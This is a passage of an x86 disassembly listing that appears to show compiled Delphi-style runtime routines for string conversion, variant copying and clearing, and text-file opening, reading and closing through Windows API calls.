  4035e9:	5d                   	pop    %ebp
  4035ea:	eb 14                	jmp    0x403600
  4035ec:	55                   	push   %ebp
  4035ed:	89 d5                	mov    %edx,%ebp
  4035ef:	89 d8                	mov    %ebx,%eax
  4035f1:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  4035f5:	89 f2                	mov    %esi,%edx
  4035f7:	e8 58 ff ff ff       	call   0x403554
  4035fc:	4f                   	dec    %edi
  4035fd:	7f f0                	jg     0x4035ef
  4035ff:	5d                   	pop    %ebp
  403600:	5f                   	pop    %edi
  403601:	5e                   	pop    %esi
  403602:	5b                   	pop    %ebx
  403603:	c3                   	ret
  403604:	b9 01 00 00 00       	mov    $0x1,%ecx
  403609:	e9 6e ff ff ff       	jmp    0x40357c
  40360e:	c3                   	ret
  40360f:	90                   	nop
  403610:	53                   	push   %ebx
  403611:	56                   	push   %esi
  403612:	57                   	push   %edi
  403613:	55                   	push   %ebp
  403614:	81 c4 00 f8 ff ff    	add    $0xfffff800,%esp
  40361a:	8b f1                	mov    %ecx,%esi
  40361c:	8b da                	mov    %edx,%ebx
  40361e:	8b f8                	mov    %eax,%edi
  403620:	85 db                	test   %ebx,%ebx
  403622:	75 09                	jne    0x40362d
  403624:	8b c6                	mov    %esi,%eax
  403626:	e8 6d fb ff ff       	call   0x403198
  40362b:	eb 61                	jmp    0x40368e
  40362d:	81 fb 00 04 00 00    	cmp    $0x400,%ebx
  403633:	7d 26                	jge    0x40365b
  403635:	6a 00                	push   $0x0
  403637:	6a 00                	push   $0x0
  403639:	68 00 08 00 00       	push   $0x800
  40363e:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403642:	50                   	push   %eax
  403643:	53                   	push   %ebx
  403644:	57                   	push   %edi
  403645:	6a 00                	push   $0x0
  403647:	6a 00                	push   $0x0
  403649:	e8 ce db ff ff       	call   0x40121c
  40364e:	8b c8                	mov    %eax,%ecx
  403650:	8b d4                	mov    %esp,%edx
  403652:	8b c6                	mov    %esi,%eax
  403654:	e8 1f fc ff ff       	call   0x403278
  403659:	eb 33                	jmp    0x40368e
  40365b:	6a 00                	push   $0x0
  40365d:	6a 00                	push   $0x0
  40365f:	6a 00                	push   $0x0
  403661:	6a 00                	push   $0x0
  403663:	53                   	push   %ebx
  403664:	57                   	push   %edi
  403665:	6a 00                	push   $0x0
  403667:	6a 00                	push   $0x0
  403669:	e8 ae db ff ff       	call   0x40121c
  40366e:	8b e8                	mov    %eax,%ebp
  403670:	8b c6                	mov    %esi,%eax
  403672:	8b cd                	mov    %ebp,%ecx
  403674:	33 d2                	xor    %edx,%edx
  403676:	e8 fd fb ff ff       	call   0x403278
  40367b:	6a 00                	push   $0x0
  40367d:	6a 00                	push   $0x0
  40367f:	55                   	push   %ebp
  403680:	8b 06                	mov    (%esi),%eax
  403682:	50                   	push   %eax
  403683:	53                   	push   %ebx
  403684:	57                   	push   %edi
  403685:	6a 00                	push   $0x0
  403687:	6a 00                	push   $0x0
  403689:	e8 8e db ff ff       	call   0x40121c
  40368e:	81 c4 00 08 00 00    	add    $0x800,%esp
  403694:	5d                   	pop    %ebp
  403695:	5f                   	pop    %edi
  403696:	5e                   	pop    %esi
  403697:	5b                   	pop    %ebx
  403698:	c3                   	ret
  403699:	8d 40 00             	lea    0x0(%eax),%eax
  40369c:	53                   	push   %ebx
  40369d:	56                   	push   %esi
  40369e:	8b f2                	mov    %edx,%esi
  4036a0:	8b d8                	mov    %eax,%ebx
  4036a2:	53                   	push   %ebx
  4036a3:	e8 84 db ff ff       	call   0x40122c
  4036a8:	8b d0                	mov    %eax,%edx
  4036aa:	8b ce                	mov    %esi,%ecx
  4036ac:	8b c3                	mov    %ebx,%eax
  4036ae:	e8 5d ff ff ff       	call   0x403610
  4036b3:	5e                   	pop    %esi
  4036b4:	5b                   	pop    %ebx
  4036b5:	c3                   	ret
  4036b6:	8b c0                	mov    %eax,%eax
  4036b8:	53                   	push   %ebx
  4036b9:	56                   	push   %esi
  4036ba:	57                   	push   %edi
  4036bb:	55                   	push   %ebp
  4036bc:	81 c4 00 f8 ff ff    	add    $0xfffff800,%esp
  4036c2:	8b d8                	mov    %eax,%ebx
  4036c4:	8b c3                	mov    %ebx,%eax
  4036c6:	e8 29 fc ff ff       	call   0x4032f4
  4036cb:	8b f0                	mov    %eax,%esi
  4036cd:	8b c3                	mov    %ebx,%eax
  4036cf:	e8 20 fc ff ff       	call   0x4032f4
  4036d4:	3d 00 04 00 00       	cmp    $0x400,%eax
  4036d9:	7d 2b                	jge    0x403706
  4036db:	68 00 04 00 00       	push   $0x400
  4036e0:	8d 44 24 04          	lea    0x4(%esp),%eax
  4036e4:	50                   	push   %eax
  4036e5:	56                   	push   %esi
  4036e6:	8b c3                	mov    %ebx,%eax
  4036e8:	e8 27 fd ff ff       	call   0x403414
  4036ed:	50                   	push   %eax
  4036ee:	6a 00                	push   $0x0
  4036f0:	6a 00                	push   $0x0
  4036f2:	e8 0d db ff ff       	call   0x401204
  4036f7:	50                   	push   %eax
  4036f8:	8d 44 24 04          	lea    0x4(%esp),%eax
  4036fc:	50                   	push   %eax
  4036fd:	e8 22 db ff ff       	call   0x401224
  403702:	8b f8                	mov    %eax,%edi
  403704:	eb 28                	jmp    0x40372e
  403706:	6a 00                	push   $0x0
  403708:	6a 00                	push   $0x0
  40370a:	56                   	push   %esi
  40370b:	53                   	push   %ebx
  40370c:	6a 00                	push   $0x0
  40370e:	6a 00                	push   $0x0
  403710:	e8 ef da ff ff       	call   0x401204
  403715:	8b e8                	mov    %eax,%ebp
  403717:	55                   	push   %ebp
  403718:	6a 00                	push   $0x0
  40371a:	e8 05 db ff ff       	call   0x401224
  40371f:	8b f8                	mov    %eax,%edi
  403721:	55                   	push   %ebp
  403722:	57                   	push   %edi
  403723:	56                   	push   %esi
  403724:	53                   	push   %ebx
  403725:	6a 00                	push   $0x0
  403727:	6a 00                	push   $0x0
  403729:	e8 d6 da ff ff       	call   0x401204
  40372e:	8b c7                	mov    %edi,%eax
  403730:	81 c4 00 08 00 00    	add    $0x800,%esp
  403736:	5d                   	pop    %ebp
  403737:	5f                   	pop    %edi
  403738:	5e                   	pop    %esi
  403739:	5b                   	pop    %ebx
  40373a:	c3                   	ret
  40373b:	90                   	nop
  40373c:	b0 0f                	mov    $0xf,%al
  40373e:	e9 d1 ee ff ff       	jmp    0x402614
  403743:	c3                   	ret
  403744:	b0 10                	mov    $0x10,%al
  403746:	e9 c9 ee ff ff       	jmp    0x402614
  40374b:	c3                   	ret
  40374c:	31 d2                	xor    %edx,%edx
  40374e:	66 8b 10             	mov    (%eax),%dx
  403751:	f7 c2 00 40 00 00    	test   $0x4000,%edx
  403757:	75 1a                	jne    0x403773
  403759:	83 fa 08             	cmp    $0x8,%edx
  40375c:	72 15                	jb     0x403773
  40375e:	81 fa 00 01 00 00    	cmp    $0x100,%edx
  403764:	75 13                	jne    0x403779
  403766:	66 c7 00 00 00       	movw   $0x0,(%eax)
  40376b:	83 c0 08             	add    $0x8,%eax
  40376e:	e9 25 fa ff ff       	jmp    0x403198
  403773:	66 c7 00 00 00       	movw   $0x0,(%eax)
  403778:	c3                   	ret
  403779:	50                   	push   %eax
  40377a:	e8 b5 da ff ff       	call   0x401234
  40377f:	c3                   	ret
  403780:	39 d0                	cmp    %edx,%eax
  403782:	74 6c                	je     0x4037f0
  403784:	66 83 38 08          	cmpw   $0x8,(%eax)
  403788:	72 1b                	jb     0x4037a5
  40378a:	50                   	push   %eax
  40378b:	52                   	push   %edx
  40378c:	66 81 38 00 01       	cmpw   $0x100,(%eax)
  403791:	74 08                	je     0x40379b
  403793:	50                   	push   %eax
  403794:	e8 9b da ff ff       	call   0x401234
  403799:	eb 08                	jmp    0x4037a3
  40379b:	83 c0 08             	add    $0x8,%eax
  40379e:	e8 f5 f9 ff ff       	call   0x403198
  4037a3:	5a                   	pop    %edx
  4037a4:	58                   	pop    %eax
  4037a5:	66 83 3a 08          	cmpw   $0x8,(%edx)
  4037a9:	73 11                	jae    0x4037bc
  4037ab:	8b 0a                	mov    (%edx),%ecx
  4037ad:	89 08                	mov    %ecx,(%eax)
  4037af:	8b 4a 08             	mov    0x8(%edx),%ecx
  4037b2:	89 48 08             	mov    %ecx,0x8(%eax)
  4037b5:	8b 4a 0c             	mov    0xc(%edx),%ecx
  4037b8:	89 48 0c             	mov    %ecx,0xc(%eax)
  4037bb:	c3                   	ret
  4037bc:	66 81 3a 00 01       	cmpw   $0x100,(%edx)
  4037c1:	75 19                	jne    0x4037dc
  4037c3:	8b 52 08             	mov    0x8(%edx),%edx
  4037c6:	09 d2                	or     %edx,%edx
  4037c8:	74 09                	je     0x4037d3
  4037ca:	8b 4a f8             	mov    -0x8(%edx),%ecx
  4037cd:	41                   	inc    %ecx
  4037ce:	7e 03                	jle    0x4037d3
  4037d0:	89 4a f8             	mov    %ecx,-0x8(%edx)
  4037d3:	66 c7 00 00 01       	movw   $0x100,(%eax)
  4037d8:	89 50 08             	mov    %edx,0x8(%eax)
  4037db:	c3                   	ret
  4037dc:	66 c7 00 00 00       	movw   $0x0,(%eax)
  4037e1:	52                   	push   %edx
  4037e2:	50                   	push   %eax
  4037e3:	e8 54 da ff ff       	call   0x40123c
  4037e8:	09 c0                	or     %eax,%eax
  4037ea:	0f 85 54 ff ff ff    	jne    0x403744
  4037f0:	c3                   	ret
  4037f1:	8d 40 00             	lea    0x0(%eax),%eax
  4037f4:	55                   	push   %ebp
  4037f5:	8b ec                	mov    %esp,%ebp
  4037f7:	83 c4 f0             	add    $0xfffffff0,%esp
  4037fa:	53                   	push   %ebx
  4037fb:	56                   	push   %esi
  4037fc:	57                   	push   %edi
  4037fd:	8b f9                	mov    %ecx,%edi
  4037ff:	8b f2                	mov    %edx,%esi
  403801:	8b d8                	mov    %eax,%ebx
  403803:	66 81 3b 00 01       	cmpw   $0x100,(%ebx)
  403808:	75 3b                	jne    0x403845
  40380a:	66 c7 45 f0 00 00    	movw   $0x0,-0x10(%ebp)
  403810:	57                   	push   %edi
  403811:	6a 00                	push   $0x0
  403813:	68 00 04 00 00       	push   $0x400
  403818:	56                   	push   %esi
  403819:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40381c:	50                   	push   %eax
  40381d:	e8 22 da ff ff       	call   0x401244
  403822:	85 c0                	test   %eax,%eax
  403824:	74 05                	je     0x40382b
  403826:	e8 11 ff ff ff       	call   0x40373c
  40382b:	8b c3                	mov    %ebx,%eax
  40382d:	e8 1a ff ff ff       	call   0x40374c
  403832:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403835:	89 03                	mov    %eax,(%ebx)
  403837:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40383a:	89 43 08             	mov    %eax,0x8(%ebx)
  40383d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403840:	89 43 0c             	mov    %eax,0xc(%ebx)
  403843:	eb 18                	jmp    0x40385d
  403845:	57                   	push   %edi
  403846:	6a 00                	push   $0x0
  403848:	68 00 04 00 00       	push   $0x400
  40384d:	56                   	push   %esi
  40384e:	53                   	push   %ebx
  40384f:	e8 f0 d9 ff ff       	call   0x401244
  403854:	85 c0                	test   %eax,%eax
  403856:	74 05                	je     0x40385d
  403858:	e8 df fe ff ff       	call   0x40373c
  40385d:	5f                   	pop    %edi
  40385e:	5e                   	pop    %esi
  40385f:	5b                   	pop    %ebx
  403860:	8b e5                	mov    %ebp,%esp
  403862:	5d                   	pop    %ebp
  403863:	c3                   	ret
  403864:	55                   	push   %ebp
  403865:	8b ec                	mov    %esp,%ebp
  403867:	51                   	push   %ecx
  403868:	53                   	push   %ebx
  403869:	8b d8                	mov    %eax,%ebx
  40386b:	33 c0                	xor    %eax,%eax
  40386d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403870:	8b 42 08             	mov    0x8(%edx),%eax
  403873:	8d 55 fc             	lea    -0x4(%ebp),%edx
  403876:	e8 21 fe ff ff       	call   0x40369c
  40387b:	8b c3                	mov    %ebx,%eax
  40387d:	e8 ca fe ff ff       	call   0x40374c
  403882:	66 c7 03 00 01       	movw   $0x100,(%ebx)
  403887:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40388a:	89 43 08             	mov    %eax,0x8(%ebx)
  40388d:	5b                   	pop    %ebx
  40388e:	59                   	pop    %ecx
  40388f:	5d                   	pop    %ebp
  403890:	c3                   	ret
  403891:	8d 40 00             	lea    0x0(%eax),%eax
  403894:	53                   	push   %ebx
  403895:	56                   	push   %esi
  403896:	8b d8                	mov    %eax,%ebx
  403898:	8b 42 08             	mov    0x8(%edx),%eax
  40389b:	e8 18 fe ff ff       	call   0x4036b8
  4038a0:	8b f0                	mov    %eax,%esi
  4038a2:	8b c3                	mov    %ebx,%eax
  4038a4:	e8 a3 fe ff ff       	call   0x40374c
  4038a9:	66 c7 03 08 00       	movw   $0x8,(%ebx)
  4038ae:	89 73 08             	mov    %esi,0x8(%ebx)
  4038b1:	5e                   	pop    %esi
  4038b2:	5b                   	pop    %ebx
  4038b3:	c3                   	ret
  4038b4:	55                   	push   %ebp
  4038b5:	8b ec                	mov    %esp,%ebp
  4038b7:	83 c4 ec             	add    $0xffffffec,%esp
  4038ba:	53                   	push   %ebx
  4038bb:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4038be:	66 8b 02             	mov    (%edx),%ax
  4038c1:	8b d9                	mov    %ecx,%ebx
  4038c3:	66 3b d8             	cmp    %ax,%bx
  4038c6:	75 0d                	jne    0x4038d5
  4038c8:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4038cb:	e8 b0 fe ff ff       	call   0x403780
  4038d0:	e9 c8 00 00 00       	jmp    0x40399d
  4038d5:	66 3d 00 01          	cmp    $0x100,%ax
  4038d9:	75 59                	jne    0x403934
  4038db:	66 83 fb 08          	cmp    $0x8,%bx
  4038df:	75 0d                	jne    0x4038ee
  4038e1:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4038e4:	e8 ab ff ff ff       	call   0x403894
  4038e9:	e9 af 00 00 00       	jmp    0x40399d
  4038ee:	66 c7 45 f0 00 00    	movw   $0x0,-0x10(%ebp)
  4038f4:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4038f7:	e8 98 ff ff ff       	call   0x403894
  4038fc:	33 c0                	xor    %eax,%eax
  4038fe:	55                   	push   %ebp
  4038ff:	68 2d 39 40 00       	push   $0x40392d
  403904:	64 ff 30             	push   %fs:(%eax)
  403907:	64 89 20             	mov    %esp,%fs:(%eax)
  40390a:	8d 55 f0             	lea    -0x10(%ebp),%edx
  40390d:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403910:	8b cb                	mov    %ebx,%ecx
  403912:	e8 dd fe ff ff       	call   0x4037f4
  403917:	33 c0                	xor    %eax,%eax
  403919:	5a                   	pop    %edx
  40391a:	59                   	pop    %ecx
  40391b:	59                   	pop    %ecx
  40391c:	64 89 10             	mov    %edx,%fs:(%eax)
  40391f:	68 9d 39 40 00       	push   $0x40399d
  403924:	8d 45 f0             	lea    -0x10(%ebp),%eax
  403927:	e8 20 fe ff ff       	call   0x40374c
  40392c:	c3                   	ret
  40392d:	e9 ca f4 ff ff       	jmp    0x402dfc
  403932:	eb f0                	jmp    0x403924
  403934:	66 81 fb 00 01       	cmp    $0x100,%bx
  403939:	75 58                	jne    0x403993
  40393b:	66 83 f8 08          	cmp    $0x8,%ax
  40393f:	75 0a                	jne    0x40394b
  403941:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403944:	e8 1b ff ff ff       	call   0x403864
  403949:	eb 52                	jmp    0x40399d
  40394b:	66 c7 45 f0 00 00    	movw   $0x0,-0x10(%ebp)
  403951:	8d 45 f0             	lea    -0x10(%ebp),%eax
  403954:	66 b9 08 00          	mov    $0x8,%cx
  403958:	e8 97 fe ff ff       	call   0x4037f4
  40395d:	33 c0                	xor    %eax,%eax
  40395f:	55                   	push   %ebp
  403960:	68 8c 39 40 00       	push   $0x40398c
  403965:	64 ff 30             	push   %fs:(%eax)
  403968:	64 89 20             	mov    %esp,%fs:(%eax)
  40396b:	8d 55 f0             	lea    -0x10(%ebp),%edx
  40396e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403971:	e8 ee fe ff ff       	call   0x403864
  403976:	33 c0                	xor    %eax,%eax
  403978:	5a                   	pop    %edx
  403979:	59                   	pop    %ecx
  40397a:	59                   	pop    %ecx
  40397b:	64 89 10             	mov    %edx,%fs:(%eax)
  40397e:	68 9d 39 40 00       	push   $0x40399d
  403983:	8d 45 f0             	lea    -0x10(%ebp),%eax
  403986:	e8 c1 fd ff ff       	call   0x40374c
  40398b:	c3                   	ret
  40398c:	e9 6b f4 ff ff       	jmp    0x402dfc
  403991:	eb f0                	jmp    0x403983
  403993:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403996:	8b cb                	mov    %ebx,%ecx
  403998:	e8 57 fe ff ff       	call   0x4037f4
  40399d:	5b                   	pop    %ebx
  40399e:	8b e5                	mov    %ebp,%esp
  4039a0:	5d                   	pop    %ebp
  4039a1:	c3                   	ret
  4039a2:	8b c0                	mov    %eax,%eax
  4039a4:	66 81 3a 00 01       	cmpw   $0x100,(%edx)
  4039a9:	75 08                	jne    0x4039b3
  4039ab:	8b 52 08             	mov    0x8(%edx),%edx
  4039ae:	e9 35 f8 ff ff       	jmp    0x4031e8
  4039b3:	53                   	push   %ebx
  4039b4:	89 c3                	mov    %eax,%ebx
  4039b6:	83 ec 10             	sub    $0x10,%esp
  4039b9:	66 c7 04 24 00 00    	movw   $0x0,(%esp)
  4039bf:	89 e0                	mov    %esp,%eax
  4039c1:	b9 00 01 00 00       	mov    $0x100,%ecx
  4039c6:	e8 e9 fe ff ff       	call   0x4038b4
  4039cb:	89 d8                	mov    %ebx,%eax
  4039cd:	e8 c6 f7 ff ff       	call   0x403198
  4039d2:	8b 44 24 08          	mov    0x8(%esp),%eax
  4039d6:	89 03                	mov    %eax,(%ebx)
  4039d8:	83 c4 10             	add    $0x10,%esp
  4039db:	5b                   	pop    %ebx
  4039dc:	c3                   	ret
  4039dd:	8d 40 00             	lea    0x0(%eax),%eax
  4039e0:	e9 67 fd ff ff       	jmp    0x40374c
  4039e5:	c3                   	ret
  4039e6:	8b c0                	mov    %eax,%eax
  4039e8:	a1 90 b4 40 00       	mov    0x40b490,%eax
  4039ed:	8b 10                	mov    (%eax),%edx
  4039ef:	89 15 90 b4 40 00    	mov    %edx,0x40b490
  4039f5:	8b 50 04             	mov    0x4(%eax),%edx
  4039f8:	89 15 24 b0 40 00    	mov    %edx,0x40b024
  4039fe:	8b 40 08             	mov    0x8(%eax),%eax
  403a01:	ff d0                	call   *%eax
  403a03:	c3                   	ret
  403a04:	8b 15 90 b4 40 00    	mov    0x40b490,%edx
  403a0a:	89 10                	mov    %edx,(%eax)
  403a0c:	8b 15 24 b0 40 00    	mov    0x40b024,%edx
  403a12:	89 50 04             	mov    %edx,0x4(%eax)
  403a15:	a3 90 b4 40 00       	mov    %eax,0x40b490
  403a1a:	c7 05 24 b0 40 00 e8 	movl   $0x4039e8,0x40b024
  403a21:	39 40 00 
  403a24:	c3                   	ret
  403a25:	8d 40 00             	lea    0x0(%eax),%eax
  403a28:	33 d2                	xor    %edx,%edx
  403a2a:	89 50 10             	mov    %edx,0x10(%eax)
  403a2d:	89 50 0c             	mov    %edx,0xc(%eax)
  403a30:	52                   	push   %edx
  403a31:	8d 50 10             	lea    0x10(%eax),%edx
  403a34:	52                   	push   %edx
  403a35:	ff 70 08             	push   0x8(%eax)
  403a38:	ff 70 14             	push   0x14(%eax)
  403a3b:	ff 30                	push   (%eax)
  403a3d:	e8 82 d7 ff ff       	call   0x4011c4
  403a42:	85 c0                	test   %eax,%eax
  403a44:	74 03                	je     0x403a49
  403a46:	33 c0                	xor    %eax,%eax
  403a48:	c3                   	ret
  403a49:	e8 a6 d7 ff ff       	call   0x4011f4
  403a4e:	c3                   	ret
  403a4f:	33 c0                	xor    %eax,%eax
  403a51:	c3                   	ret
  403a52:	51                   	push   %ecx
  403a53:	8b 50 0c             	mov    0xc(%eax),%edx
  403a56:	85 d2                	test   %edx,%edx
  403a58:	7e 1a                	jle    0x403a74
  403a5a:	33 c9                	xor    %ecx,%ecx
  403a5c:	89 48 0c             	mov    %ecx,0xc(%eax)
  403a5f:	51                   	push   %ecx
  403a60:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  403a64:	51                   	push   %ecx
  403a65:	52                   	push   %edx
  403a66:	ff 70 14             	push   0x14(%eax)
  403a69:	ff 30                	push   (%eax)
  403a6b:	e8 74 d7 ff ff       	call   0x4011e4
  403a70:	85 c0                	test   %eax,%eax
  403a72:	74 04                	je     0x403a78
  403a74:	33 c0                	xor    %eax,%eax
  403a76:	59                   	pop    %ecx
  403a77:	c3                   	ret
  403a78:	e8 77 d7 ff ff       	call   0x4011f4
  403a7d:	eb f7                	jmp    0x403a76
  403a7f:	ff 30                	push   (%eax)
  403a81:	c7 40 04 b0 d7 00 00 	movl   $0xd7b0,0x4(%eax)
  403a88:	e8 ef d6 ff ff       	call   0x40117c
  403a8d:	48                   	dec    %eax
  403a8e:	75 01                	jne    0x403a91
  403a90:	c3                   	ret
  403a91:	e8 5e d7 ff ff       	call   0x4011f4
  403a96:	c3                   	ret
  403a97:	56                   	push   %esi
  403a98:	8b f0                	mov    %eax,%esi
  403a9a:	33 c0                	xor    %eax,%eax
  403a9c:	89 46 0c             	mov    %eax,0xc(%esi)
  403a9f:	89 46 10             	mov    %eax,0x10(%esi)
  403aa2:	8b 46 04             	mov    0x4(%esi),%eax
  403aa5:	2d b1 d7 00 00       	sub    $0xd7b1,%eax
  403aaa:	74 0b                	je     0x403ab7
  403aac:	48                   	dec    %eax
  403aad:	74 20                	je     0x403acf
  403aaf:	48                   	dec    %eax
  403ab0:	74 2e                	je     0x403ae0
  403ab2:	e9 49 01 00 00       	jmp    0x403c00
  403ab7:	b8 00 00 00 80       	mov    $0x80000000,%eax
  403abc:	ba 02 00 00 00       	mov    $0x2,%edx
  403ac1:	b9 03 00 00 00       	mov    $0x3,%ecx
  403ac6:	c7 46 1c 28 3a 40 00 	movl   $0x403a28,0x1c(%esi)
  403acd:	eb 27                	jmp    0x403af6
  403acf:	b8 00 00 00 40       	mov    $0x40000000,%eax
  403ad4:	ba 01 00 00 00       	mov    $0x1,%edx
  403ad9:	b9 02 00 00 00       	mov    $0x2,%ecx
  403ade:	eb 0f                	jmp    0x403aef
  403ae0:	b8 00 00 00 c0       	mov    $0xc0000000,%eax
  403ae5:	ba 01 00 00 00       	mov    $0x1,%edx
  403aea:	b9 03 00 00 00       	mov    $0x3,%ecx
  403aef:	c7 46 1c 52 3a 40 00 	movl   $0x403a52,0x1c(%esi)
  403af6:	c7 46 24 7f 3a 40 00 	movl   $0x403a7f,0x24(%esi)
  403afd:	c7 46 20 4f 3a 40 00 	movl   $0x403a4f,0x20(%esi)
  403b04:	80 7e 48 00          	cmpb   $0x0,0x48(%esi)
  403b08:	0f 84 ae 00 00 00    	je     0x403bbc
  403b0e:	6a 00                	push   $0x0
  403b10:	68 80 00 00 00       	push   $0x80
  403b15:	51                   	push   %ecx
  403b16:	6a 00                	push   $0x0
  403b18:	52                   	push   %edx
  403b19:	50                   	push   %eax
  403b1a:	8d 46 48             	lea    0x48(%esi),%eax
  403b1d:	50                   	push   %eax
  403b1e:	e8 61 d6 ff ff       	call   0x401184
  403b23:	83 f8 ff             	cmp    $0xffffffff,%eax
  403b26:	0f 84 eb 00 00 00    	je     0x403c17
  403b2c:	89 06                	mov    %eax,(%esi)
  403b2e:	81 7e 04 b3 d7 00 00 	cmpl   $0xd7b3,0x4(%esi)
  403b35:	0f 85 a3 00 00 00    	jne    0x403bde
  403b3b:	ff 4e 04             	decl   0x4(%esi)
  403b3e:	6a 00                	push   $0x0
  403b40:	ff 36                	push   (%esi)
  403b42:	e8 5d d6 ff ff       	call   0x4011a4
  403b47:	40                   	inc    %eax
  403b48:	0f 84 c9 00 00 00    	je     0x403c17
  403b4e:	2d 81 00 00 00       	sub    $0x81,%eax
  403b53:	73 02                	jae    0x403b57
  403b55:	33 c0                	xor    %eax,%eax
  403b57:	6a 00                	push   $0x0
  403b59:	6a 00                	push   $0x0
  403b5b:	50                   	push   %eax
  403b5c:	ff 36                	push   (%esi)
  403b5e:	e8 79 d6 ff ff       	call   0x4011dc
  403b63:	40                   	inc    %eax
  403b64:	0f 84 ad 00 00 00    	je     0x403c17
  403b6a:	6a 00                	push   $0x0
  403b6c:	8b d4                	mov    %esp,%edx
  403b6e:	6a 00                	push   $0x0
  403b70:	52                   	push   %edx
  403b71:	68 80 00 00 00       	push   $0x80
  403b76:	8d 96 4c 01 00 00    	lea    0x14c(%esi),%edx
  403b7c:	52                   	push   %edx
  403b7d:	ff 36                	push   (%esi)
  403b7f:	e8 40 d6 ff ff       	call   0x4011c4
  403b84:	5a                   	pop    %edx
  403b85:	48                   	dec    %eax
  403b86:	0f 85 8b 00 00 00    	jne    0x403c17
  403b8c:	33 c0                	xor    %eax,%eax
  403b8e:	3b c2                	cmp    %edx,%eax
  403b90:	73 4c                	jae    0x403bde
  403b92:	80 bc 06 4c 01 00 00 	cmpb   $0x1a,0x14c(%esi,%eax,1)
  403b99:	1a 
  403b9a:	74 03                	je     0x403b9f
  403b9c:	40                   	inc    %eax
  403b9d:	eb ef                	jmp    0x403b8e
  403b9f:	6a 02                	push   $0x2
  403ba1:	6a 00                	push   $0x0
  403ba3:	2b c2                	sub    %edx,%eax
  403ba5:	50                   	push   %eax
  403ba6:	ff 36                	push   (%esi)
  403ba8:	e8 2f d6 ff ff       	call   0x4011dc
  403bad:	40                   	inc    %eax
  403bae:	74 67                	je     0x403c17
  403bb0:	ff 36                	push   (%esi)
  403bb2:	e8 1d d6 ff ff       	call   0x4011d4
  403bb7:	48                   	dec    %eax
  403bb8:	75 5d                	jne    0x403c17
  403bba:	eb 22                	jmp    0x403bde
  403bbc:	c7 46 24 4f 3a 40 00 	movl   $0x403a4f,0x24(%esi)
  403bc3:	81 7e 04 b2 d7 00 00 	cmpl   $0xd7b2,0x4(%esi)
  403bca:	74 04                	je     0x403bd0
  403bcc:	6a f6                	push   $0xfffffff6
  403bce:	eb 02                	jmp    0x403bd2
  403bd0:	6a f5                	push   $0xfffffff5
  403bd2:	e8 d5 d5 ff ff       	call   0x4011ac
  403bd7:	83 f8 ff             	cmp    $0xffffffff,%eax
  403bda:	74 3b                	je     0x403c17
  403bdc:	89 06                	mov    %eax,(%esi)
  403bde:	81 7e 04 b1 d7 00 00 	cmpl   $0xd7b1,0x4(%esi)
  403be5:	74 17                	je     0x403bfe
  403be7:	ff 36                	push   (%esi)
  403be9:	e8 a6 d5 ff ff       	call   0x401194
  403bee:	85 c0                	test   %eax,%eax
  403bf0:	74 10                	je     0x403c02
  403bf2:	83 f8 02             	cmp    $0x2,%eax
  403bf5:	75 07                	jne    0x403bfe
  403bf7:	c7 46 20 52 3a 40 00 	movl   $0x403a52,0x20(%esi)
  403bfe:	33 c0                	xor    %eax,%eax
  403c00:	5e                   	pop    %esi
  403c01:	c3                   	ret
  403c02:	ff 36                	push   (%esi)
  403c04:	e8 73 d5 ff ff       	call   0x40117c
  403c09:	c7 46 04 b0 d7 00 00 	movl   $0xd7b0,0x4(%esi)
  403c10:	b8 69 00 00 00       	mov    $0x69,%eax
  403c15:	eb e9                	jmp    0x403c00
  403c17:	c7 46 04 b0 d7 00 00 	movl   $0xd7b0,0x4(%esi)
  403c1e:	e8 d1 d5 ff ff       	call   0x4011f4
  403c23:	eb db                	jmp    0x403c00
  403c25:	8d 88 4c 01 00 00    	lea    0x14c(%eax),%ecx
  403c2b:	89 48 14             	mov    %ecx,0x14(%eax)
  403c2e:	33 c9                	xor    %ecx,%ecx
  403c30:	89 08                	mov    %ecx,(%eax)
  403c32:	c7 40 04 b0 d7 00 00 	movl   $0xd7b0,0x4(%eax)
  403c39:	c7 40 08 80 00 00 00 	movl   $0x80,0x8(%eax)
  403c40:	89 48 0c             	mov    %ecx,0xc(%eax)
  403c43:	89 48 10             	mov    %ecx,0x10(%eax)
  403c46:	c7 40 18 97 3a 40 00 	movl   $0x403a97,0x18(%eax)
  403c4d:	89 48 1c             	mov    %ecx,0x1c(%eax)
  403c50:	89 48 20             	mov    %ecx,0x20(%eax)
  403c53:	89 48 24             	mov    %ecx,0x24(%eax)
  403c56:	8d 40 48             	lea    0x48(%eax),%eax
  403c59:	85 d2                	test   %edx,%edx
  403c5b:	74 1b                	je     0x403c78
  403c5d:	b5 82                	mov    $0x82,%ch
  403c5f:	8a 0a                	mov    (%edx),%cl
  403c61:	42                   	inc    %edx
  403c62:	88 08                	mov    %cl,(%eax)
  403c64:	40                   	inc    %eax
  403c65:	84 c9                	test   %cl,%cl
  403c67:	74 11                	je     0x403c7a
  403c69:	8a 0a                	mov    (%edx),%cl
  403c6b:	42                   	inc    %edx
  403c6c:	88 08                	mov    %cl,(%eax)
  403c6e:	40                   	inc    %eax
  403c6f:	84 c9                	test   %cl,%cl
  403c71:	74 07                	je     0x403c7a
  403c73:	fe cd                	dec    %ch
  403c75:	75 e8                	jne    0x403c5f
  403c77:	48                   	dec    %eax
  403c78:	88 28                	mov    %ch,(%eax)
  403c7a:	c3                   	ret
  403c7b:	8b 50 04             	mov    0x4(%eax),%edx
  403c7e:	81 fa b2 d7 00 00    	cmp    $0xd7b2,%edx
  403c84:	75 08                	jne    0x403c8e
  403c86:	ff 50 1c             	call   *0x1c(%eax)
  403c89:	85 c0                	test   %eax,%eax
  403c8b:	75 0e                	jne    0x403c9b
  403c8d:	c3                   	ret
  403c8e:	81 fa b1 d7 00 00    	cmp    $0xd7b1,%edx
